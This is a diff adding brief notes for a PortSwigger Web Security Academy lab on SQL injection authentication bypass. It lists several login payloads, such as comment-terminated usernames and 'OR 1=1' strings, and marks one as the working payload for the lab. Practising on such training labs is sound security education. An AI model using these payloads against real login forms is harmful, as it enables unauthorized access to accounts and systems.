@@ -1,0 +1,30 @@
+# ==========================================
+# PortSwigger Web Security Academy
+# Lab: SQL Injection Authentication Bypass
+# ==========================================
+
+# Step 1 - Original Login
+administrator
+password
+
+# Step 2 - Authentication Bypass Payloads
+
+administrator'-- -
+
+administrator' #
+
+administrator'/*
+
+' OR 1=1-- -
+
+' OR '1'='1'-- -
+
+# ==========================================
+# Final Working Payload (Lab)
+# ==========================================
+
+Username:
+administrator'-- -
+
+Password:
+(any value)
